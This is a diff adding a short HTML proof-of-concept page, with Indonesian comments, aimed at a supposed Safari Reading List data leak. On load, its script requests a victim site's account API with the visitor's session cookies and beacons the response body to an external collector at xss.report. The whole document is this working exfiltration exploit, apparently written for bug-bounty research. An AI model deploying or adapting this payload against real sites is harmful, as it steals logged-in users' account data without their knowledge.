@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Reading List Leak PoC</title>
+  <meta charset="UTF-8">
+</head>
+<body>
+  <h1>Testing Reading List Data Leak</h1>
+
+  <script>
+    // Fungsi utama yang akan dijalankan ulang saat dibuka dari Reading List
+    async function exploit() {
+      try {
+        const res = await fetch("https://target-victim-site.com/api/account", {
+          method: "GET",
+          credentials: "include", // Critical: include session cookies
+          mode: "cors" // Bypass attempts
+        });
+
+        // Jika Safari salah menganggap origin ini "trusted" → bisa baca body!
+        const text = await res.text();
+
+        // Kirim hasil ke server bounty hunter
+        navigator.sendBeacon("https://xss.report/c/waduh", text);
+      } catch (err) {
+        console.error("Blocked or failed:", err);
+      }
+    }
+
+    // Delay agar Reading List sempat load total
+    window.addEventListener("load", () => {
+      setTimeout(exploit, 1000);
+    });
+  </script>
+</body>
+</html>
